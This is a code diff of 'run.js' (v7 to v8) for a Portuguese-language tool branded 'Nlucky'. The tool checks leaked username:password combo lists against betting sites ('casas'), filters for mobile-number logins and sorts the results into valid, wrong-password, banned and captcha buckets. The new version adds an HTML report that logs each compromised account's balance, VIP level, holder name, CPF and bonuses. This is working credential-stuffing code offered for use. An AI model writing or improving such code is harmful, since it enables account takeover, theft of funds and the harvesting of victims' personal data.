@@ -1,4 +1,4 @@
-// run.js v7 — filtro de celular (3º dígito 9) + branding Nlucky + verificação profunda de bônus
+// run.js v8 — filtro de celular (3º dígito 9) + branding Nlucky + verificação profunda de bônus + relatório HTML
 import fs from "fs";
 import path from "path";
 import { exec } from "child_process";
@@ -12,6 +12,7 @@ import { runPool } from "./pool.js";
 import { banner, prompt, separator, c } from "./ui.js";
 import { sendDesktopNotification } from "./notification.js";
 import { verificarBonus } from "./deepCheck.js";
+import { iniciarRelatorio, registrar, finalizarRelatorio } from "./report.js";
 
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
@@ -75,7 +76,10 @@ function log(msg) {
   try { process.stdout.write(msg + "\n"); } catch {}
 }
 
+let txtAtivo = false;
+
 function appendSafe(file, texto) {
+  if (!txtAtivo) return;
   try {
     fs.appendFileSync(file, texto, "utf-8");
   } catch (e) {
@@ -93,6 +97,20 @@ const CLASS_TO_BUCKET = {
 };
 
 const RETRY_STATUS = new Set(["INCONCLUSIVO", "CAPTCHA", "ERRO"]);
+
+function tipoDe(report, config) {
+  if (report.bonus?.hit) return "bonus";
+  if (report.status === "PROIBIDA") return "proibida";
+  if (report.status === "LOGIN_OK") {
+    const saldoOk = report.saldo !== null && report.saldo >= config.minBalance;
+    const vipOk = report.vip !== null && report.vip >= config.minVip;
+    return saldoOk || vipOk || report.saldo === null ? "hit" : "sem_saldo";
+  }
+  if (report.status === "SENHA_ERRADA") return "senha";
+  if (report.status === "NAO_EXISTE") return "nao_existe";
+  if (report.status === "CAPTCHA") return "captcha";
+  return "inconclusivo";
+}
 
 export async function cmdRun() {
   const casas = loadCasas();
@@ -138,7 +156,6 @@ export async function cmdRun() {
     const usuario = linha.slice(0, idx).trim();
     const senha = linha.slice(idx + 1).trim();
     if (!usuario || !senha) continue;
-    // só celular: 11 dígitos com "9" no 3º (DDD + 9)
     if (filtro9 && /^\d{11}$/.test(usuario) && usuario[2] !== "9") { ignoradas++; continue; }
     const chave = `${usuario.toLowerCase()}:${senha}`;
     if (vistos.has(chave)) { duplicadas++; continue; }
@@ -191,6 +208,9 @@ export async function cmdRun() {
   let concluidas = 0;
   let pendentesAtual = 0;
   let finalizado = false;
+
+  txtAtivo = !!config.txtDetalhado;
+  iniciarRelatorio(alvo);
 
   process.stdout.write("\u001b[2J\u001b[H\u001b[4;r\u001b[4;1H");
   header = `  ${c.ACCENT2}${c.B}NLUCKY${c.RESET} ${c.DIM}│${c.RESET} casas:${alvo.length} contas:${contas.length} threads:${threads} delay:${delay}ms`;
@@ -290,6 +310,21 @@ export async function cmdRun() {
         }
 
         resultados.set(chave, report.status);
+
+        registrar({
+          casa: nome,
+          conta: report.conta,
+          tipo: tipoDe(report, config),
+          status: report.status,
+          saldo: report.saldo,
+          vip: report.vip,
+          vipLabel: report.vipLabel,
+          nome: report.nome,
+          cpf: report.cpf,
+          bonus: report.bonus,
+          detalhe: report.detalhe,
+        });
+
         appendSafe(
           path.join(hitsDir, `completo_${nome}.txt`),
           `${report.conta} | ${report.status} | ${vip} | saldo=${saldoTxt} | p${passe} | bonus=${bonus?.hit ? `${bonus.total}x/${bonus.somaTotal}` : "-"} | ${report.detalhe}\n`,
@@ -299,6 +334,7 @@ export async function cmdRun() {
         resultados.set(chave, "ERRO");
         falhas.push(`${nome} | ${conta} | ${e.message}`);
         log(`${c.R}[💥 ERRO]${c.RESET} ${nome} │ ${conta} │ ${e.message}`);
+        registrar({ casa: nome, conta, tipo: "erro", status: "ERRO", detalhe: e.message });
         appendSafe(
           path.join(hitsDir, `completo_${nome}.txt`),
           `${conta} | ERRO | ? | saldo=? | p${passe} | ${e.message}\n`,
@@ -362,6 +398,13 @@ export async function cmdRun() {
     for (const f of falhas.slice(0, 30)) console.log(`   ${c.DIM}-${c.RESET} ${f}`);
     if (falhas.length > 30) console.log(`   ${c.DIM}... +${falhas.length - 30}${c.RESET}`);
     console.log();
+  }
+  try {
+    const relatorio = finalizarRelatorio();
+    console.log(`  📊 Relatório: ${relatorio}`);
+    exec(`start "" "${relatorio}"`);
+  } catch (e) {
+    console.log(`  ⚠️ relatório falhou: ${e.message}`);
   }
   console.log(`  📄 CSV: ${csvFile}`);
   console.log(`  📁 Hits por casa em: ${hitsDir}\n`);
